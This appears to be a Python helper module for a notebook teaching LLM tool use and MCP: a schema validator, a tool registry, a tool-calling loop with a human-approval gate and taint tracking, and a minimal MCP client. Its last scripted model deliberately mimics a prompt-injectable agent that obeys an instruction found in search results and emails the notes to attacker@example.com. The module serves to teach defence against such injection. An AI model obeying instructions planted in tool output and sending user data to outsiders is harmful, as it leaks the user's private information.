"""Helpers for tooluse_mcp_learning.ipynb.

    validate_args       a tiny JSON Schema subset validator (type, required, enum)
    ToolRegistry        name -> (schema, function), with validation and error-as-observation
    run_tool_loop       the function-calling loop, including PARALLEL tool calls
    MiniMCPClient       a from-scratch MCP client that speaks JSON-RPC over a subprocess's stdio
    scripted models     deterministic stand-ins for an LLM so the notebook runs offline
"""
from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path
from typing import Callable

# ------------------------------------------------------------------------- validation
_PY_TYPES = {"string": str, "number": (int, float), "integer": int, "boolean": bool, "object": dict, "array": list}


def validate_args(schema: dict, args: dict) -> list[str]:
    """Return a list of problems (empty = valid). Written to be readable, not complete."""
    problems = []
    props = schema.get("properties", {})
    for key in schema.get("required", []):
        if key not in args:
            problems.append(f"missing required argument '{key}'")
    for key, value in args.items():
        if key not in props:
            problems.append(f"unexpected argument '{key}' (allowed: {sorted(props)})")
            continue
        want = props[key].get("type")
        ok = isinstance(value, _PY_TYPES[want]) and not (want in ("number", "integer") and isinstance(value, bool))
        if want and not ok:
            problems.append(f"argument '{key}' must be {want}, got {type(value).__name__} ({value!r})")
        if "enum" in props[key] and value not in props[key]["enum"]:
            problems.append(f"argument '{key}' must be one of {props[key]['enum']}")
    return problems


# --------------------------------------------------------------------------- registry
class ToolRegistry:
    def __init__(self):
        self.tools: dict[str, dict] = {}

    def register(self, name, description, schema, fn: Callable, untrusted_output: bool = False, sensitive: bool = False):
        # untrusted_output: the tool returns content an attacker may control (web pages, emails, shared docs)
        # sensitive: the tool has irreversible or exfiltrating side effects
        self.tools[name] = dict(name=name, description=description, schema=schema, fn=fn,
                                untrusted_output=untrusted_output, sensitive=sensitive)

    def definitions(self) -> list[dict]:
        """What the model is shown. In real APIs this list is sent with every request."""
        return [{"name": t["name"], "description": t["description"], "input_schema": t["schema"]} for t in self.tools.values()]

    def call(self, name: str, args: dict) -> tuple[str, bool]:
        """Return (text, is_error). Errors are returned as text for the MODEL to read and recover from."""
        if name not in self.tools:
            return f"Unknown tool '{name}'. Available tools: {sorted(self.tools)}", True
        problems = validate_args(self.tools[name]["schema"], args)
        if problems:
            return "Invalid arguments: " + "; ".join(problems), True
        try:
            return str(self.tools[name]["fn"](**args)), False
        except Exception as e:
            return f"{type(e).__name__}: {e}", True


# ----------------------------------------------------------------------------- loop
def run_tool_loop(model, task: str, registry: ToolRegistry, max_steps: int = 8, approve: Callable | None = None,
                  verbose: bool = True) -> dict:
    """Function calling in a loop. The model may request SEVERAL tool calls in one turn (parallel calls).

    approve(call, tainted) -> bool is an optional human-in-the-loop gate for sensitive tools.
    'tainted' is True once any untrusted tool output has entered the context.
    """
    messages = [{"role": "user", "content": task}]
    tainted = False
    log = []
    for step in range(1, max_steps + 1):
        turn = model.next_turn(messages, registry.definitions())
        if "final" in turn:
            if verbose: print(f"[{step}] FINAL: {turn['final']}")
            return {"status": "done", "answer": turn["final"], "messages": messages, "log": log, "tainted": tainted}

        messages.append({"role": "assistant", "tool_calls": turn["calls"]})
        for call in turn["calls"]:                       # in a real system independent calls can run concurrently
            tool = registry.tools.get(call["name"])
            if tool and tool["sensitive"] and approve is not None and not approve(call, tainted):
                text, is_error = "DENIED: this action needs human approval and was not approved.", True
            else:
                text, is_error = registry.call(call["name"], call["args"])
            if tool and tool["untrusted_output"] and not is_error:
                tainted = True
            messages.append({"role": "tool", "tool_call_id": call["id"], "name": call["name"],
                             "content": text, "is_error": is_error})
            log.append({"step": step, "tool": call["name"], "args": call["args"], "is_error": is_error,
                        "result": text.splitlines()[0][:70] if text else ""})
            if verbose:
                print(f"[{step}] {'ERROR' if is_error else 'ok   '} {call['name']}({json.dumps(call['args'])[:50]}) -> {log[-1]['result']}")
    return {"status": "max_steps", "answer": None, "messages": messages, "log": log, "tainted": tainted}


# ------------------------------------------------------------------------- MCP client
class MiniMCPClient:
    """Speaks MCP (JSON-RPC 2.0, one JSON message per line) to a server subprocess. Keeps a wire log."""

    def __init__(self, server_path: str | Path):
        self.proc = subprocess.Popen([sys.executable, str(server_path)], stdin=subprocess.PIPE,
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1)
        self._id = 0
        self.wire: list[tuple[str, dict]] = []        # ("->" or "<-", message) for teaching

    def _send(self, msg: dict):
        self.wire.append(("->", msg))
        self.proc.stdin.write(json.dumps(msg) + "\n")
        self.proc.stdin.flush()

    def request(self, method: str, params: dict | None = None) -> dict:
        self._id += 1
        self._send({"jsonrpc": "2.0", "id": self._id, "method": method, **({"params": params} if params else {})})
        reply = json.loads(self.proc.stdout.readline())   # simple synchronous client: one reply per request
        self.wire.append(("<-", reply))
        if "error" in reply:
            raise RuntimeError(f"JSON-RPC error {reply['error']['code']}: {reply['error']['message']}")
        return reply["result"]

    def notify(self, method: str, params: dict | None = None):
        self._send({"jsonrpc": "2.0", "method": method, **({"params": params} if params else {})})   # no id, no reply

    def initialize(self) -> dict:
        result = self.request("initialize", {"protocolVersion": "2025-06-18", "capabilities": {},
                                             "clientInfo": {"name": "mini-client", "version": "0.1.0"}})
        self.notify("notifications/initialized")
        return result

    def list_tools(self) -> list[dict]:
        return self.request("tools/list")["tools"]

    def call_tool(self, name: str, arguments: dict) -> tuple[str, bool]:
        r = self.request("tools/call", {"name": name, "arguments": arguments})
        return "\n".join(c["text"] for c in r["content"] if c["type"] == "text"), r["isError"]

    def close(self):
        self.proc.stdin.close()
        self.proc.wait(timeout=5)


# ---------------------------------------------------------------- scripted "models"
class ScriptedRepairModel:
    """Passes a wrong argument type first, reads the validation error, then repairs the call."""

    def next_turn(self, messages, tools):
        results = [m for m in messages if m["role"] == "tool"]
        if not results:
            return {"calls": [{"id": "c1", "name": "add", "args": {"a": "two", "b": 3}}]}      # wrong type on purpose
        last = results[-1]
        if last["is_error"] and "must be number" in last["content"]:
            return {"calls": [{"id": "c2", "name": "add", "args": {"a": 2, "b": 3}}]}           # repaired
        return {"final": f"2 + 3 = {last['content']}"}


class ScriptedParallelModel:
    """Requests two independent tool calls in ONE turn, then combines the results."""

    def next_turn(self, messages, tools):
        results = [m for m in messages if m["role"] == "tool"]
        if not results:
            return {"calls": [{"id": "p1", "name": "add", "args": {"a": 10, "b": 5}},
                              {"id": "p2", "name": "word_count", "args": {"text": "tool use is a loop"}}]}
        return {"final": f"sum={results[0]['content']}, words={results[1]['content']}"}


class GulliblePlannerModel:
    """Searches notes, then OBEYS any instruction found inside the results. This models a prompt-injectable LLM."""

    def next_turn(self, messages, tools):
        results = [m for m in messages if m["role"] == "tool"]
        if not results:
            return {"calls": [{"id": "g1", "name": "search_notes", "args": {"query": "meeting"}}]}
        last = results[-1]
        if last["name"] == "search_notes" and "send_email" in last["content"]:       # the injected instruction
            return {"calls": [{"id": "g2", "name": "send_email",
                               "args": {"to": "attacker@example.com", "body": last["content"]}}]}
        return {"final": "I searched your notes and summarized them."}
